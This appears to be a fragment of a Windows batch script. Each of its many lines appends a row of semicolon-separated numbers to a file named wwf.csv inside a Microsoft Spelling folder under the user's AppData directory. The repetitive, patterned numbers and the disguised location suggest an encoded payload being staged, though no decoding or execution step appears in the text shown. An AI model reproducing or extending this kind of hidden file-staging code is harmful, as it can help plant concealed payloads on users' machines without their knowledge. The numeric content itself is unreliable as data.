>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.348;0.548;0.7876;648.0;654.0;748.0;3858.450;0.648;0.748;0.1132;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(548.0;348.0;648.0;9852.348;0.450;0.752;0.6917;348.0;348.0;348.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5019.348;0.453;0.650;0.4137;553.0;451.0;352.0;4100.649;0.451;0.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6787;648.0;648.0;648.0;3338.652;0.748;0.448;0.3681;448.0;648.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(748.0;9012.449;0.548;0.448;0.3473;748.0;349.0;348.0;5786.748;0.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.755;0.3670;368.0;349.0;470.0;9537.465;0.653;0.755;0.0899;667.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(352.0;565.0;4399.369;0.368;0.557;0.8393;570.0;548.0;365.0;3179.751;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.550;0.369;0.8381;556.0;652.0;765.0;7474.565;0.748;0.470;0.4569;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(765.0;769.0;570.0;8427.368;0.648;0.668;0.0340;769.0;357.0;569.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3831.756;0.470;0.668;0.1084;754.0;765.0;769.0;9873.367;0.556;0.570;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2157;456.0;655.0;570.0;0761.766;0.748;0.651;0.5863;355.0;354.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(454.0;9587.567;0.756;0.551;0.5558;652.0;567.0;757.0;5209.457;0.657;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.450;0.4916;649.0;369.0;566.0;2639.750;0.351;0.666;0.7133;569.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(355.0;357.0;8620.765;0.568;0.757;0.6741;568.0;453.0;568.0;3491.467;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.567;0.349;0.6847;768.0;468.0;457.0;7213.765;0.568;0.350;0.7653;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(551.0;654.0;749.0;5771.651;0.750;0.449;0.5416;648.0;750.0;657.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5672.648;0.648;0.666;0.7111;655.0;650.0;651.0;9796.667;0.670;0.757;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8754;356.0;748.0;657.0;2091.753;0.555;0.370;0.5683;667.0;752.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(769.0;0632.449;0.755;0.655;0.9111;349.0;748.0;656.0;2078.670;0.367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.454;0.0253;548.0;555.0;355.0;9457.655;0.452;0.370;0.1386;750.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(657.0;469.0;3236.356;0.751;0.550;0.7909;648.0;669.0;357.0;7202.350;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.369;0.665;0.0988;648.0;353.0;369.0;9362.767;0.569;0.452;0.8548;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(569.0;556.0;450.0;2488.749;0.567;0.348;0.2874;365.0;753.0;769.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2114.770;0.669;0.756;0.4606;470.0;549.0;654.0;7861.752;0.653;0.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4015;652.0;567.0;348.0;6524.467;0.457;0.551;0.4723;367.0;649.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(565.0;6569.566;0.357;0.457;0.7601;550.0;656.0;653.0;5123.368;0.754;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.650;0.3542;750.0;567.0;765.0;1081.365;0.654;0.753;0.8692;450.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(567.0;649.0;5478.768;0.670;0.365;0.9111;768.0;454.0;551.0;4220.368;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.455;0.352;0.3264;353.0;368.0;754.0;6832.770;0.350;0.768;0.7988;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(469.0;553.0;770.0;7268.449;0.355;0.769;0.8573;353.0;669.0;365.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6777.770;0.748;0.370;0.6794;367.0;552.0;357.0;1292.354;0.551;0.568;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6482;450.0;354.0;349.0;2831.767;0.656;0.465;0.0696;549.0;750.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(552.0;3293.751;0.354;0.353;0.5534;449.0;556.0;650.0;4144.748;0.354;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.468;0.4407;367.0;748.0;357.0;1166.751;0.451;0.752;0.2369;552.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(768.0;553.0;9339.765;0.368;0.350;0.6848;557.0;551.0;828.208;0973.683;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.821;0.815;0.1945;816.0;801.0;809.0;6182.346;0.667;0.811;0.9068;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(809.0;812.0;811.0;5683.810;0.801;0.810;0.6494;816.0;777.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9905.800;0.801;0.808;0.6864;546.0;568.0;397.0;7597.816;0.397;0.565;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8734;810.0;810.0;811.0;0852.816;0.497;0.816;0.5815;805.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;0515.815;0.444;0.432;0.5295;586.0;801.0;814.0;8105.815;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.2281;810.0;361.0;652.0;0922.746;0.448;0.346;0.3110;348.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(346.0;748.0;1191.644;0.432;0.367;0.5499;817.0;808.0;816.0;1080.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.801;0.2809;461.0;810.0;801.0;1680.817;0.816;0.814;0.3869;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(397.0;808.0;544.0;4039.332;0.480;0.817;0.9684;398.0;808.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6580.699;0.575;0.801;0.7280;821.0;684.0;811.0;3425.807;0.801;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3810;461.0;351.0;549.0;9973.498;0.802;0.651;0.5843;356.0;753.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(454.0;5306.397;0.800;0.351;0.9042;454.0;352.0;801.0;2216.651;0.553;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.828;174.2924;483.0;821.0;815.0;0466.816;0.801;0.809;0.2982;346.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;811.0;6835.810;0.802;0.805;0.7254;803.0;817.0;814.0;3676.597;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.805;0.2547;811.0;810.0;744.0;2565.532;0.586;0.801;0.2567;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;815.0;805.0;9035.811;0.810;0.761;0.0646;552.0;546.0;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9286.746;0.748;0.346;0.1260;748.0;544.0;732.0;4986.367;0.817;0.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7723;816.0;817.0;814.0;9724.801;0.761;0.810;0.5172;801.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;0714.814;0.597;0.808;0.4226;744.0;532.0;680.0;0206.817;0.498;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.0844;805.0;599.0;575.0;6006.801;0.821;0.784;0.0887;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.0;801.0;8832.810;0.461;0.598;0.0326;648.0;551.0;802.0;7971.353;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.802;0.755;0.1188;802.0;749.0;449.0;9804.800;0.753;0.748;0.6823;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.0;551.0;397.0;8488.828;190.583;0.821;0.1722;815.0;816.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2735.809;0.446;0.367;0.9040;811.0;810.0;802.0;7625.805;0.803;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0373;814.0;697.0;816.0;8484.805;0.811;0.810;0.6853;346.0;373.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;5448.815;0.816;0.397;0.8441;808.0;808.0;544.0;5158.432;0.786;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.9383;814.0;815.0;805.0;0223.811;0.810;0.561;0.9342;652.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.0;448.0;9529.346;0.548;0.446;0.1310;348.0;544.0;732.0;1691.767;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.808;0.3958;816.0;817.0;814.0;2775.801;0.361;0.810;0.7666;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;817.0;816.0;4752.814;0.497;0.808;0.0360;444.0;732.0;380.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9096.817;0.698;0.808;0.9501;805.0;399.0;675.0;5277.801;0.821;0.584;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5448;811.0;807.0;801.0;6949.810;0.661;0.398;0.7354;748.0;451.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.0;3849.553;0.802;0.555;0.1909;802.0;649.0;349.0;4850.800;0.553;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.8331;397.0;451.0;597.0;9980.828;168.483;0.821;0.8759;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;801.0;2189.809;0.446;0.568;0.9441;801.0;812.0;808.0;5596.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.821;0.809;0.8188;801.0;810.0;816.0;1860.344;0.632;0.786;0.6874;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;814.0;815.0;5312.805;0.811;0.810;0.3414;761.0;552.0;346.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5394.448;0.446;0.648;0.4076;346.0;448.0;444.0;5449.532;0.567;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9378;808.0;816.0;817.0;9922.814;0.801;0.461;0.6196;810.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;1224.816;0.814;0.497;0.6413;808.0;644.0;732.0;8623.380;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.798;0.6134;808.0;805.0;699.0;5565.475;0.801;0.821;0.5364;484.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;807.0;0845.801;0.810;0.661;0.4517;498.0;648.0;451.0;6539.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.553;0.802;0.0592;355.0;802.0;649.0;8887.649;0.800;0.753;0.8246;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(448.0;397.0;751.0;8022.797;0.828;160.383;0.0045;821.0;815.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8075.801;0.809;0.746;0.5374;468.0;801.0;815.0;3616.805;0.803;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3145;544.0;432.0;786.0;1983.801;0.814;0.815;0.0637;805.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;9664.361;0.352;0.546;0.0120;748.0;746.0;548.0;5643.646;0.448;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.544;0.9277;632.0;767.0;817.0;7184.808;0.816;0.817;0.9265;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;361.0;6861.810;0.801;0.817;0.4105;816.0;814.0;597.0;0530.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.544;0.632;0.5257;580.0;817.0;598.0;0955.808;0.805;0.699;0.4888;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(575.0;801.0;821.0;2037.384;0.811;0.807;0.4820;801.0;810.0;461.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4707.698;0.748;0.751;0.3202;802.0;753.0;802.0;7957.555;0.802;0.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5319;649.0;800.0;453.0;5189.648;0.697;0.751;0.4005;597.0;828.182;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(483.0;3882.821;0.815;0.816;0.9084;801.0;809.0;546.0;3471.668;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.5653;801.0;799.0;816.0;6125.811;0.814;0.821;0.8564;583.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;814.0;6975.818;0.805;0.599;0.2888;801.0;815.0;744.0;0040.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.786;0.801;0.9940;814.0;815.0;805.0;5994.811;0.810;0.361;0.8802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(352.0;446.0;348.0;6347.546;0.748;0.646;0.8813;548.0;444.0;432.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6680.667;0.817;0.808;0.4118;816.0;817.0;814.0;7368.801;0.361;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0924;801.0;817.0;816.0;9063.814;0.397;0.808;0.1299;744.0;332.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(780.0;5473.817;0.698;0.808;0.8287;805.0;499.0;475.0;6040.801;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.784;0.3370;811.0;807.0;801.0;2415.810;0.761;0.798;0.5965;348.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(651.0;802.0;8710.553;0.802;0.755;0.5488;802.0;749.0;349.0;9228.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.353;0.748;0.2505;797.0;451.0;397.0;2355.828;176.383;0.821;0.6038;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;816.0;801.0;7078.809;0.546;0.468;0.7334;814.0;497.0;819.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1904.805;0.810;0.803;0.9046;646.0;668.0;801.0;1082.815;0.805;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6730;810.0;644.0;632.0;2838.386;0.801;0.814;0.3978;815.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;8066.810;0.361;0.652;0.7062;646.0;648.0;446.0;8953.448;0.546;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.748;0.7362;544.0;432.0;567.0;8014.817;0.808;0.816;0.2856;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;801.0;3324.461;0.810;0.801;0.4201;817.0;816.0;814.0;6686.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.744;0.8026;332.0;580.0;817.0;0725.598;0.808;0.805;0.7922;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(699.0;475.0;801.0;6845.821;0.584;0.811;0.2178;807.0;801.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1562.561;0.598;0.648;0.5526;751.0;802.0;653.0;0262.802;0.655;0.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5717;549.0;349.0;800.0;0958.553;0.448;0.597;0.5278;451.0;597.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.162;2426.783;0.821;0.815;0.9454;816.0;801.0;809.0;2477.646;0.468;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.7617;497.0;819.0;805.0;4176.810;0.803;0.544;0.5855;732.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(386.0;801.0;2275.814;0.815;0.805;0.7486;811.0;810.0;761.0;2052.652;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.746;0.448;0.3199;546.0;648.0;346.0;2377.348;0.544;0.532;0.0608;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(667.0;817.0;808.0;6250.816;0.817;0.814;0.4863;801.0;761.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8233.801;0.817;0.816;0.7762;814.0;397.0;808.0;6243.744;0.632;0.780;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2528;817.0;598.0;808.0;2744.805;0.499;0.475;0.7904;801.0;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(784.0;3277.811;0.807;0.801;0.1390;810.0;361.0;598.0;3603.748;0.551;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.802;0.9904;553.0;802.0;455.0;8548.802;0.549;0.749;0.2196;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(553.0;748.0;5498.597;0.651;0.397;0.3152;828.184;583.0;821.0;3441.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.801;0.7050;809.0;446.0;569.0;0169.810;0.816;0.801;0.7687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;812.0;814.0;2111.805;0.815;0.801;0.6877;683.0;801.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6930.818;0.805;0.499;0.8730;801.0;815.0;744.0;2681.532;0.686;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8930;814.0;815.0;805.0;4885.811;0.810;0.761;0.7329;752.0;546.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(648.0;9717.746;0.448;0.646;0.1626;748.0;744.0;732.0;9888.667;0.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.5220;816.0;817.0;814.0;5737.801;0.561;0.810;0.0393;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;816.0;3063.814;0.597;0.808;0.1460;644.0;632.0;480.0;3743.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.398;0.808;0.6740;805.0;799.0;775.0;1428.801;0.821;0.784;0.6958;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;807.0;801.0;9428.810;0.761;0.498;0.8204;448.0;351.0;802.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0359.753;0.802;0.755;0.8974;802.0;349.0;749.0;3383.800;0.653;0.348;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1709;697.0;451.0;397.0;9190.828;168.383;0.821;0.8826;815.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;5404.809;0.546;0.577;0.6369;497.0;810.0;497.0;7110.803;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.809;0.0258;801.0;810.0;816.0;4662.344;0.532;0.486;0.7527;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;815.0;1951.805;0.811;0.810;0.6647;561.0;552.0;646.0;4967.648;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.446;0.448;0.2570;546.0;548.0;544.0;3926.632;0.367;0.817;0.4371;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;816.0;817.0;8200.814;0.801;0.361;0.9571;810.0;801.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1650.816;0.814;0.797;0.6727;808.0;744.0;332.0;2854.580;0.817;0.698;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0821;808.0;805.0;499.0;6831.375;0.801;0.821;0.1237;384.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.0;4658.801;0.810;0.361;0.1446;398.0;648.0;651.0;2705.802;0.453;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.802;0.1340;455.0;802.0;549.0;2874.449;0.800;0.653;0.9887;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(397.0;551.0;7720.697;0.828;166.783;0.2748;821.0;815.0;816.0;5864.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.809;0.346;0.7635;777.0;801.0;815.0;0665.815;0.797;0.803;0.4959;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;810.0;803.0;1378.544;0.732;0.486;0.1299;801.0;814.0;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0763.805;0.811;0.810;0.8328;361.0;752.0;446.0;0688.548;0.346;0.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.9634;746.0;548.0;344.0;9228.632;0.367;0.817;0.9274;808.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;1852.814;0.801;0.761;0.5132;810.0;801.0;817.0;1523.816;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.597;0.1828;808.0;744.0;732.0;9170.480;0.817;0.798;0.4644;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;699.0;8399.675;0.801;0.821;0.6854;484.0;811.0;807.0;5159.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.661;0.2987;698.0;448.0;751.0;4556.802;0.653;0.802;0.8913;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(455.0;802.0;349.0;1352.449;0.800;0.553;0.8247;448.0;597.0;751.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9631.597;0.828;164.383;0.3269;821.0;815.0;816.0;5107.801;0.809;0.546;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4159;478.0;801.0;816.0;8261.546;0.472;0.816;0.6395;816.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(444.0;3327.732;0.386;0.801;0.6490;814.0;815.0;805.0;4928.811;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.561;0.9541;352.0;446.0;348.0;4971.646;0.448;0.446;0.4656;548.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(744.0;632.0;1464.567;0.817;0.808;0.1109;816.0;817.0;814.0;0798.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.761;0.810;0.4853;801.0;817.0;816.0;7198.814;0.497;0.808;0.2427;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(344.0;432.0;480.0;8524.817;0.598;0.808;0.5949;805.0;599.0;575.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6372.801;0.821;0.584;0.0441;811.0;807.0;801.0;7375.810;0.461;0.398;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5010;548.0;651.0;802.0;3173.753;0.802;0.755;0.8863;802.0;749.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(349.0;5726.800;0.653;0.548;0.2898;697.0;451.0;497.0;0524.828;186.383;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.821;0.5937;815.0;816.0;801.0;2449.809;0.546;0.678;0.3457;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;746.0;1473.772;0.816;0.816;0.7510;812.0;346.0;387.0;6307.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.798;0.782;0.7628;801.0;813.0;817.0;5520.801;0.815;0.816;0.7357;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(744.0;332.0;786.0;6711.801;0.814;0.815;0.4847;805.0;811.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1363.661;0.352;0.646;0.8056;648.0;446.0;448.0;9801.546;0.448;0.644;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7094;632.0;467.0;817.0;1376.808;0.816;0.817;0.4811;814.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(361.0;3636.810;0.801;0.817;0.0485;816.0;814.0;697.0;9862.808;0.744;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.332;0.8956;380.0;817.0;798.0;2590.808;0.805;0.399;0.5727;775.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;821.0;0189.384;0.811;0.807;0.7446;801.0;810.0;361.0;6540.498;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.648;0.451;0.3036;802.0;553.0;802.0;7663.755;0.802;0.349;0.4623;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(549.0;800.0;653.0;8993.648;0.597;0.451;0.3653;597.0;828.222;383.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7984.821;0.815;0.816;0.7857;801.0;809.0;446.0;1015.382;0.817;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3907;816.0;805.0;809.0;5914.801;0.546;0.383;0.9194;801.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;3752.597;0.808;0.805;0.6328;822.0;797.0;816.0;0962.805;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.5847;446.0;370.0;811.0;8757.814;0.809;0.797;0.5025;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;801.0;1192.814;0.815;0.346;0.0822;683.0;811.0;497.0;6895.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.744;0.532;0.2091;786.0;801.0;814.0;1280.815;0.805;0.811;0.1155;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;661.0;752.0;2638.346;0.548;0.346;0.5062;648.0;446.0;348.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1335.744;0.332;0.367;0.1926;817.0;808.0;816.0;9513.817;0.814;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8397;761.0;810.0;801.0;9154.817;0.816;0.814;0.6681;797.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(544.0;4098.432;0.680;0.817;0.7430;498.0;808.0;805.0;9556.399;0.675;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.5220;821.0;684.0;811.0;8107.807;0.801;0.810;0.6690;461.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.0;348.0;8746.651;0.802;0.353;0.7260;802.0;455.0;802.0;4906.649;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.749;0.800;0.3142;753.0;648.0;697.0;1560.651;0.697;0.828;192.5209;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(383.0;821.0;815.0;1777.816;0.801;0.809;0.5751;346.0;582.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8342.810;0.816;0.805;0.3808;809.0;801.0;446.0;5442.787;0.805;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2167;800.0;811.0;819.0;6931.815;0.782;0.817;0.4737;810.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;6258.809;0.801;0.744;0.1773;732.0;786.0;801.0;3923.814;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.805;0.1540;811.0;810.0;761.0;9402.552;0.646;0.548;0.4515;746.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(548.0;546.0;3954.548;0.744;0.532;0.9392;367.0;817.0;808.0;4279.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.814;0.0085;801.0;361.0;810.0;8699.801;0.817;0.816;0.1377;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;597.0;808.0;4294.744;0.632;0.780;0.1490;817.0;498.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1946.805;0.799;0.675;0.7272;801.0;821.0;584.0;6711.811;0.807;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4864;810.0;461.0;598.0;3517.355;0.555;0.497;0.3383;453.0;599.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(453.0;3691.654;0.749;0.657;0.5941;451.0;652.0;801.0;6588.548;0.656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.357;0.1956;828.204;483.0;821.0;0679.815;0.816;0.801;0.8509;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(746.0;682.0;1752.817;0.810;0.816;0.1047;805.0;809.0;801.0;5178.746;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.687;0.805;0.9073;810.0;800.0;811.0;5172.819;0.815;0.582;0.5783;
